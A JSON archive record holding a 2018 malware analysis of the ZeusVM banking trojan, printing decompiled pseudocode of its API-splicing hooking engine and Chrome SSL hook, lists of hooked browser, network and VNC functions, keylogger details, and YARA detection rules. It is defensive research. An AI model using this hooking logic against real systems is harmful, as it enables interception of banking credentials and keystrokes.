{
    "id": "79acb600-c7ba-4139-a86c-7bcf2ef0b5dc",
    "created_at": "2023-01-12T15:01:40.750609Z",
    "updated_at": "2025-03-27T02:06:09.497694Z",
    "deleted_at": null,
    "sha1_hash": "3150433c0ffc5193e4409d48c48603b4990285e1",
    "title": "2018-10-31 - Let's Learn- Exploring ZeusVM Banking Malware Hooking Engine",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:07Z",
    "file_modification_date": "2022-05-28T04:40:07Z",
    "file_size": 551083,
    "plain_text": "# Let's Learn: Exploring ZeusVM Banking Malware Hooking Engine\n\n**[vkremez.com/2018/10/lets-learn-exploring-zeusvm-banking.html](https://www.vkremez.com/2018/10/lets-learn-exploring-zeusvm-banking.html)**\n\n## Goal: Analyze and reverse one of the latest ZeusVM variants with the special attention to its main client module and its keylogger component.\n\n very interesting sample... thanks for sharing! looks like a vmzeus 3.3.7.0 using botnet name \"bt337\". it's been a long time since i've seen an active one of these. — tildedennis (@tildedennis) October 27, 2018\n\n Source: Original Packed Loader 32-Bit (x86) (MD5: 649d7732a28818947146070b6959fbd9) Client 32-Bit Executable (x86) (MD5: f024f3ec18de88a7745b5f3a90c69a31) Keylogger \"klog\" Executable 32-Bit (x86)(MD5: 3ef2632c2476c33def2c51b0e383cab1) Outline\n```\nI. Background\nII. ZeusVM Banker: Client 32-Bit Executable (x86)\nIII. Hooking Engine EnterHook\nA. MainHook API Logic\nB. EnterHook\nC. Hooked API calls\n1. TlsGetValue API Hook\n2. “CreateProcessNotifyApi\" Hook and Other Kernel32/Wininet API Hooks\n3. Mozilla Firefox API Hook\n4. Google Chrome SSL Hook\nD. ExitHook\nIV. ZeusVM Keylogger Executable\nA. Keylog “Init” Function\nB. Keylog Take Screenshot Function\nV. Yara Signature\nA. ZeusVM Client Version\nB. ZeusVM Keylogger Component\nVI. Indicators of Compromise (IOCs)\nVII. Addendum: Hooked API Calls\n\n Background\n This latest binary of the ZeusVM banking malware was initially identified by @Racco42 and tagged by @James_inthe_box. Before diving deeper into this malware variant, I highly recommend reading Dennis Schwartz' report titled \"ZeusVM: Bits and Pieces.\" The focus of this report is to explore the ZeusVM banking malware hooking and engine. Malware Analysis\n\n```\n\n-----\n\n## The ZeusVM client consists of 903 functions with the size of 229.50 KB (235008 bytes). The original Zeus client consisted of 558 functions with the size of 138.00 KB (141312 bytes). Leveraging the Diaphora plugin, it was identified that there are 371 function best matches (including function hash, bytes hash, perfect match, equal pseudo-code, equal assembly, same rare MD index), 130 function partial matches (including mnemonics same-primes- product, callgraph match, pseudo-code fuzzy hash, same constants, similar small pseudo- code), 55 function unreliable matches (including strongly connected components and same- primes-product), and 345 function unmatched matches in the latest ZeusVM as compared to the leaked Zeus 2.0.8.9 client. The ZeusVM is, by and large, an evolution of the leaked Zeus variant. The ZeusVM binary adds various dynamic API loading methodology with the additional features (e.g., Google Chrome API hooking).\n\n III. Hooking Engine The ZesVM malware employs API hook splicing technique to intercept API calls of interest by inserting a jump instruction. ZeusVM hooking engine is leveraged to hook various browser and other API for information-stealing purposes. A. HookAPI\n\n\n-----\n\n## The hooking engine of the malware is char type HookAPI one taking five parameters to hook API calls of interest. The function allocates memory and sets up proper protections and calls two additional functions that I describe as “EnterHook” and “ExitHook” ones. The HookAPI function sequence -> checks if the function is at the base address -> \"AllocateBuffer\" (via VirtualAlloc API call) -> \"EnterHook\" setting up the trampoline and splicing the call -> \"ExitHook\" function. The pseudo-coded ZeusVM HookiAPI function is as follows:\n\n\n-----\n\n```\n//////////////////////////////////////////////////\n//////////// ZeusVM HookAPI Function /////////////\n//////////////////////////////////////////////////\nchar __stdcall HookAPI(HANDLE hProcess, DWORD flOldProtect, int a3, LPVOID\nlpBaseAddress, int a5)\n{\n v5 = a3;\n if ( (LPVOID)a3 != lpBaseAddress || !VirtualAlloc_func(a3, hProcess,\n(int)&lpBaseAddress, (int)&a3) )\n  return 0;\n v7 = 0;\n if ( v5 )\n {\n  v8 = a3;\n  v9 = flOldProtect + 8;\n  while ( *(_DWORD *)(v9 - 8) )\n  {\n   *(_DWORD *)(v9 + 4) = v8;\n   *(_DWORD *)v9 = 0;\n   *(_BYTE *)(v9 + 8) = 0;\n   ++v7;\n   v8 += 0x37;\n   v9 += 0x14;\n   if ( v7 >= v5 )\n    goto LABEL_8;\n  }\n  result = 0;\n }\n else\n {\nLABEL_8:\n  v10 = (char *)lpBaseAddress;\n  if ( lpBaseAddress )\n  {\n   a3 = 0;\n   if ( v5 > 0 )\n   {\n    originalFunction = flOldProtect + 4;\n    do\n    {\n     v12 = EnterHook(\n         hProcess,\n         originalFunction - 4,\n         *(_DWORD *)originalFunction,\n         v10,\n         *(LPVOID *)(originalFunction + 8));\n     if ( !v12 )\n      break;\n     *(_DWORD *)(originalFunction + 4) = v10;\n     v10 += v12;\n     ++a3;\n     *(_BYTE *)(originalFunction + 12) = v12;\n     originalFunction += 20;\n    }\n\n```\n\n-----\n\n```\n    while ( a3 < v5 );\n   }\n   if ( a3 == v5 )\n    return 1;\n   ExitHook(hProcess, flOldProtect, v5);\n  }\n  result = 0;\n }\n return result;\n}\n\n## B. EnterHook The “EnterHook” function is the SIZE_T type taking 5 parameters. ZeusVM enables its hooks as follows leveraging VirtualProtect with the usual pJmp->opcode = 0xE9 (32-bit relative JMP).\n//////////////////////////////////////////////////\n//////////// ZeusVM EnterHook Function /////////////\n//////////////////////////////////////////////////\nSIZE_T __stdcall EnterHook(HANDLE hProcess, int functionForHook, \\\nint hookerFunction, LPVOID lpBaseAddress, LPVOID originalFunction)\n{\n v5 = *(_DWORD *)functionForHook;\n v6 = 0;\n v19 = 0;\n memset(&Buffer, 0x90, 0x28u);\n memset(&v15, 0x90, 0x37u);\n while ( 1 )\n {\n  if ( VirtualQuery_checkAvalibleBytes((_BYTE *)v5, hProcess) < 5 )\n   return 0;\n  if ( ((int (__stdcall *)(int, _DWORD))loc_433710)(v5, 0) != 2 || *(_BYTE *)v5 !=\n-21 )\n   break;\n  v5 += *(_BYTE *)(v5 + 1) + 2;\n }\n if ( VirtualQuery_checkAvalibleBytes((_BYTE *)v5, hProcess) >= 0x1E\n  && VirtualProtectEx(hProcess, (LPVOID)v5, 0x1Eu, 0x40u, &flOldProtect) )\n   // Set up proper execution access\n {\n  if ( ReadProcessMemory(hProcess, (LPCVOID)v5, &Buffer, 0x1Eu, 0) )\n\n```\n\n-----\n\n```\n  // Read the original function code\n  {\n   v8 = 0;\n   for ( i = (char *)&Buffer; ; i = (char *)(&Buffer + v8) )\n   {\n    v10 = ((int (__stdcall *)(char *, _DWORD))loc_433710)(i, 0);\n    if ( v10 == 0xFFFFFFFF )\n     break;\n    v8 += v10;\n    if ( v8 > 0x23 )\n     break;\n    if ( v8 >= 5 )\n    {\n     nSize = v8;\n     v22 = 0;\n     do\n     {\n      v11 = (char *)(&Buffer + v22);\n      v12 = ((int (__stdcall *)(unsigned __int8 *, _DWORD))loc_433710)(&Buffer\n+ v22, 0);\n      v13 = *v11;\n      if ( *v11 != 0xE9u && v13 != 0xE8u || v12 != 5 )\n      {\n       qmemcpy(&v15 + v6, v11, v12);\n       v6 += v12;\n      }\n      else\n      {\n       *(&v15 + v6) = v13;\n       *(int *)((char *)&v16 + v6) = v5 + v22 + *(_DWORD *)(v11 + 1) - v6 (_DWORD)a5;\n       v6 += 5;\n      }\n      v22 += v12;\n     }\n     while ( v22 != nSize );\n     if ( WriteProcessMemory(hProcess, lpBaseAddress, &Buffer, nSize, 0) )\n     {\n      *(int *)((char *)&v16 + v6) = nSize - v6 - (_DWORD)a5 + v5 - 5;\n      *(&v15 + v6) = 0xE9u;\n      if ( WriteProcessMemory(hProcess, a5, &v15, v6 + 5, 0) )\n      {\n       v18 = hookerFunction - v5 - 5;\n       v14 = *(_DWORD *)functionForHook;\n       Buffer = 0xE9u;\n      // \"0xE9\" -> opcode for a jump with a 32bit relative offset\n\n```\n\n-----\n\n```\n       NtCreateThread_func(v14, (int)a5);\n       if ( WriteProcessMemory(hProcess, (LPVOID)v5, &Buffer, 5u, 0) )\n        v19 = nSize;\n      }\n     }\n     break;\n    }\n   }\n  }\n  VirtualProtectEx(hProcess, (LPVOID)v5, 0x1Eu, flOldProtect, &flOldProtect);\n }\n *(_DWORD *)functionForHook = v5;\n return v19;\n}\n\n## C. ZeusVM Hooked API The “EnterHook” function is the SIZE_T type taking 5 parameters. The function employs VirtualQuery to check for available bytes, sets up proper execution access, reads the original API function and overwrites it with the 0xe9, which is an opcode for a jump with a 32-bit relative offset. This similar technique is used in many malware variants (including Ramnit, Gozi ISFB, Panda, and others). 1. TlsGetValue Hook ZeusVM just like the leaked Zeus 2.0.8.9 sets up a function hook for TlsGetValue API call to intercept child process flags.\n\n 2. “CreateProcessNotifyApi\" Hook and Other Kernel32/Wininet Hooks The malware sets up a plethora of various process and information specific API calls that were originally called \"corehook\" in the original Zeus 2.0.8.9. Again, this malware simply borrows the previous ZeusVM exact API hooks.\n\n```\n\n-----\n\n```\n////////////////////////////////////////////////////////////////////////////////\n//////////// ZeusVM CreateProcessNotifyApi and Other Function Hook /////////////\n////////////////////////////////////////////////////////////////////////////////\n int (__stdcall *NtCreateUserProcess)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD,\n_DWORD, _DWORD, \n_DWORD);\n WCHAR pszPath; \n NtCreateUserProcess = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, \n_DWORD, _DWORD, _DWORD))::NtCreateUserProcess;\n if ( ::NtCreateUserProcess )\n {\n  dword_43825C = (int)sub_41B216;      \n }\n else\n {\n  NtCreateUserProcess = NtCreateThread;\n  dword_43825C = (int)sub_41B160;\n }\n...\n dword_438564 = (int)TranslateMessage;\n dword_438578 = (int)GetClipboardData;\n dword_43858C = (int)PFXImportCertStore;\n dword_438018 = (int)HttpSendRequestW;\n dword_438058 = (int)HttpSendRequestA;\n dword_438098 = (int)HttpSendRequestExW;\n dword_4380D8 = (int)HttpSendRequestExA;\n dword_438118 = (int)InternetCloseHandle;\n dword_438158 = (int)InternetReadFile;\n dword_438198 = (int)InternetReadFileExA;\n dword_4381D8 = (int)InternetQueryDataAvailable;\n dword_438218 = (int)HttpQueryInfoA;\n if ( !SHGetFolderPathW(0, 0x25, 0, 0, &pszPath) )\n {\n  PathRemoveBackslashW(&pszPath);\n  PathCombineW_func(L\"wininet.dll\", &pszPath, &pszPath);\n  sub_42E9C6(&pszPath);\n }\n return HookAPI((HANDLE)0xFFFFFFFF, (DWORD)&NtCreateUserProcess_0, 0x2A,\n(LPVOID)0x2A, 1);\n\n## 3. Mozilla Firefox API Hook As usual, the malware sets up browser-specific Mozilla Firefox API hooks.\n\n```\n\n-----\n\n## 4. Google Chrome SSL Hook While it is relatively easy to find and hook DLL exported functions: \"PR_Read\" and \"PR_Write\" in the Mozilla Firefox browser, it is much more complicated to do the same for Google Chrome, wherein the functions \"SSL_Read\" and \"SSL_Write\" functions are not exported in the same fashion. The hooking algorithm necessitates walking the Google Chrome \"boringssl\" chrome.dll's '.rdata' section to locate the necessary functions. For more information, please review this helpful article on the exact methodology. The pseudo-coded C++ is as follows:\n\n\n-----\n\n```\n/////////////////////////////////////////////////////////\n//////////// ZeusVM Google Chrome Hooks ///////////////\n////////////////////////////////////////////////////////\nchar __stdcall ChromeSSLHook(int a1)\n{\n int v1; \n char result;\n char v3; \n v1 = SearchforChrome_rdata(a1);\n if ( v1 )\n {\n  dword_438604 = *(_DWORD *)(v1 + 4);\n  dword_438618 = *(_DWORD *)(v1 + 8);\n  dword_43862C = *(_DWORD *)(v1 + 12);\n  v3 = HookAPI((HANDLE)0xFFFFFFFF, (DWORD)&dword_438604, 3, (LPVOID)3, 1);\n  if ( v3 )\n   sub_42F2FB(a1, dword_438610, dword_438624, dword_438638);\n  result = v3;\n }\n else\n {\n  result = 0;\n }\n return result;\n}\n\n## D. ExitHook The malware's ExitHook function simply returns the permissions and protection and function previous state before the hook via the following sequence: checkAvalibleBytes -> VirtualProtectEx -> WriteProcessMemory (with original function)  > VirtualProtectEx. IV. Keylogger Executable ZesVM malware also drops its own primitive keylogger with screenshot capabilities. The total executable is 6.00 KB (6144 bytes); its own internal name is “keylogger.exe,” and it contains 8 functions with the export functions \"Init\" and \"Uninit.\"\n\n A. Keylog “Init” Function & \"TakeScreenshot\" Function The keylogger logic is unsophisticated formatting the keylogged data formatting as \"KLog\\\\file\\\\%04d.%02d.%02d.%02d.%02d.%02d.%02d_%05d\" and the grabbed screenshots formatting as “KLog\\\\screen\\\\%04d.%02d.%02d.%02d.%02d.%02d.%02d_%05d.”\n\n```\n\n-----\n\n## V.Yara Signature A. ZeusVM Client Version\n```\nimport \"pe\"\nrule crime_win32_zeusvm_client_banker {\n meta:\n   author = \"@VK_Intel\"\n   reference = \"Detects ZeusVM client\"\n   date = \"2018-10-29\"\n   hash1 = \"4d2705b74f7648fdf741f87e4eee9a71c823ac649d53dd5715cb3a6b6d0b6c10\"\n strings:\n   $s0 = \"http://www.google.com/webhp\" fullword ascii\n   $s1 = \"bcdfghjklmnpqrstvwxzaeiouy\" fullword ascii\n   $s2 = \"FIXME\" fullword ascii\n   $s3 = \"vnc\" fullword ascii\n   $s4 = \"socks\" fullword ascii\n   $xor_decode = { 0f b7 c0 8d ?? ?? ?? ?? ?? ?? 33 d2 33 c9 66 ?? ?? ?? 73 ?? 56\n8b ?? ?? 0f b7 f1 8a ?? ?? 32 ?? 32 d1 41 88 ?? ?? 66 ?? ?? ?? 72 ?? 5e 0f ?? ?? ??\nc6 ?? ?? ?? c3}\n condition:\n   ( uint16(0) == 0x5a4d and\n    filesize < 700KB and\n    pe.imphash() == \"97cdaa72c3f228ec37eb171715fe20ca\" and\n    ( all of them )\n   ) or ( all of them )\n}\n\n B. ZeusVM Keylogger Component\n\n```\n\n-----\n\n```\nimport pe \nrule crime_win32_zeusvm_keylogger_component_banker {\n  meta:\n   author = \"@VK_Intel\"\n   reference = \"Detects ZeusVM Keylogger Component\"\n   date = \"2018-10-29\"\n   hash1 = \"58cea503342f555b71cc09c1599bb12910f193109bd88d387bca44b99035553f\"\n  strings:\n   $s1 = \"keylog.exe\" fullword ascii\n   $s2 = \"KLog\\\\screen\\\\%04d.%02d.%02d.%02d.%02d.%02d.%02d_%05d\" fullword wide\n   $s3 = \"KLog\\\\file\\\\%04d.%02d.%02d.%02d.%02d.%02d.%02d_%05d\" fullword wide\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 20KB and\n     pe.imphash() == \"ea04b0c46651d6d5ecb1bc99e6050fd8\" and pe.exports(\"Uninit\")\nand\n     ( all of them )\n   ) or ( all of them )\n}\nVII. Addendum: Hooked API Calls\n*following the same Zeus 2.0.8.9 convention*\nCore Hook API\n {NULL, CoreHook::hookerLdrLoadDll,          NULL, 0},\n {NULL, CoreHook::hookerNtQueryDirectoryFile,     NULL, 0},\n {NULL, CoreHook::hookerNtCreateFile,         NULL, 0},\n {NULL, CoreHook::hookerGetFileAttributesExW,     NULL, 0},\n\n## Wininet Hook API\n {NULL, WininetHook::hookerHttpSendRequestW,      NULL, 0},\n {NULL, WininetHook::hookerHttpSendRequestA,      NULL, 0},\n {NULL, WininetHook::hookerHttpSendRequestExW,     NULL, 0},\n {NULL, WininetHook::hookerHttpSendRequestExA,     NULL, 0},\n {NULL, WininetHook::hookerInternetCloseHandle,    NULL, 0},\n {NULL, WininetHook::hookerInternetReadFile,      NULL, 0},\n {NULL, WininetHook::hookerInternetReadFileExA,    NULL, 0},\n {NULL, WininetHook::hookerInternetQueryDataAvailable, NULL, 0},\n {NULL, WininetHook::hookerHttpQueryInfoA,       NULL, 0},\n\n Sock Hook API\n {NULL, SocketHook::hookerCloseSocket,         NULL, 0},\n {NULL, SocketHook::hookerSend,            NULL, 0},\n {NULL, SocketHook::hookerWsaSend,           NULL, 0},\n\n```\n\n-----\n\n## VNC Server Hook API\n```\n {NULL, VncServer::hookerOpenInputDesktop,       NULL, 0},\n {NULL, VncServer::hookerSwitchDesktop,        NULL, 0},\n {NULL, VncServer::hookerDefWindowProcW,        NULL, 0},\n {NULL, VncServer::hookerDefWindowProcA,        NULL, 0},\n {NULL, VncServer::hookerDefDlgProcW,         NULL, 0},\n {NULL, VncServer::hookerDefDlgProcA,         NULL, 0},\n {NULL, VncServer::hookerDefFrameProcW,        NULL, 0},\n {NULL, VncServer::hookerDefFrameProcA,        NULL, 0},\n {NULL, VncServer::hookerDefMDIChildProcW,       NULL, 0},\n {NULL, VncServer::hookerDefMDIChildProcA,       NULL, 0},\n {NULL, VncServer::hookerCallWindowProcW,       NULL, 0},\n {NULL, VncServer::hookerCallWindowProcA,       NULL, 0},\n {NULL, VncServer::hookerRegisterClassW,        NULL, 0},\n {NULL, VncServer::hookerRegisterClassA,        NULL, 0},\n {NULL, VncServer::hookerRegisterClassExW,       NULL, 0},\n {NULL, VncServer::hookerRegisterClassExA,       NULL, 0},\n {NULL, VncServer::hookerBeginPaint,          NULL, 0},\n {NULL, VncServer::hookerEndPaint,           NULL, 0},\n {NULL, VncServer::hookerGetDcEx,           NULL, 0},\n {NULL, VncServer::hookerGetDc,            NULL, 0},\n {NULL, VncServer::hookerGetWindowDc,         NULL, 0},\n {NULL, VncServer::hookerReleaseDc,          NULL, 0},\n {NULL, VncServer::hookerGetUpdateRect,        NULL, 0},\n {NULL, VncServer::hookerGetUpdateRgn,         NULL, 0},\n {NULL, VncServer::hookerGetMessagePos,        NULL, 0},\n {NULL, VncServer::hookerGetCursorPos,         NULL, 0},\n {NULL, VncServer::hookerSetCursorPos,         NULL, 0},\n {NULL, VncServer::hookerSetCapture,          NULL, 0},\n {NULL, VncServer::hookerReleaseCapture,        NULL, 0},\n {NULL, VncServer::hookerGetCapture,          NULL, 0},\n {NULL, VncServer::hookerGetMessageW,         NULL, 0},\n {NULL, VncServer::hookerGetMessageA,         NULL, 0},\n {NULL, VncServer::hookerPeekMessageW,         NULL, 0},\n {NULL, VncServer::hookerPeekMessageA,         NULL, 0},\n\n User Hook API\n {NULL, UserHook::hookerTranslateMessage,       NULL, 0},\n {NULL, UserHook::hookerGetClipboardData,       NULL, 0},\n {NULL, UserHook::hookerSetWindowTextW,        NULL, 0},\n\n CertStore Hook API\n {NULL, CertStoreHook::_hookerPfxImportCertStore,   NULL, 0},\n\n TlsGetValue Hook API\nTlsGetValue\n\n```\n\n-----\n\n## Mozilla Firefox Hook API\n```\nPR_OpenTCPSocket\nPR_Close\nPR_Read\nPR_Write\nPR_Poll\nPR_GetNameForIdentity\nPR_SetError\nPR_GetError\n\n Google Chrome Hook API\nSSL_Read\nSSL_Write\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-10-31 - Let's Learn- Exploring ZeusVM Banking Malware Hooking Engine.pdf"
    ],
    "report_names": [
        "2018-10-31 - Let's Learn- Exploring ZeusVM Banking Malware Hooking Engine.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535700,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1653712807,
    "ts_modification_date": 1653712807,
    "files": {
        "pdf": "https://archive.orkl.eu/3150433c0ffc5193e4409d48c48603b4990285e1.pdf",
        "text": "https://archive.orkl.eu/3150433c0ffc5193e4409d48c48603b4990285e1.txt",
        "img": "https://archive.orkl.eu/3150433c0ffc5193e4409d48c48603b4990285e1.jpg"
    }
}